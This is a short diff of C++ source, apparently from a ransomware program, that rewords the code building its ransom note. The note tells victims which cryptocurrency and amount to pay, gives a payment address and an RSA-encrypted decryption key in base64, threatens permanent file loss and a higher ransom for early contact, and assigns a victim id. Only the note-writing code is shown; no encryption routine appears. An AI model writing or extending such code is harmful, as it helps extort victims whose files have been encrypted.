@@ -235,10 +235,10 @@ namespace dune
             note += "You must pay in this type of cryptocurrency " + crypto_currency_type + ".\n";
             note += "The ransom amount is " + std::to_string(ransom_amount) + " " + crypto_currency_type + ".\n";
             note += "The address to pay is: \n\n" + address + "\n\n";
-            note += "This address is specific to this attack. If you have multiple attacks paying another address will not help you get your files back. ";
-            note += "The full amount or more must be paid to the " + crypto_currency_type + " address specified.\n";
+            note += "This address is specific to this attack. If you have multiple attacks pending paying another address will not help you regain your files. The full amount or more must be paid to the " + 
+                crypto_currency_type + " address specified.\n";
 
-            note += "DO NOT MODIFY THIS OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key for decryption)\n\n" + base64_encode((unsigned char *)(encrypted_key.data()), encrypted_key.length()) + "\n\n";
+            note += "DO NOT MODIFY THIS, OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key for decryption)\n\n" + base64_encode((unsigned char *)(encrypted_key.data()), encrypted_key.length()) + "\n\n";
             note += "Send this whole file to this email address AFTER you have paid the ransom: " + hacker_email + "\n\nIf you contact this email before the ransom is paid in full it will likely be increased.\n\n\n";
             note += "This is your victim id: " + generate_uuid() + ".\n";
             int success = 0;
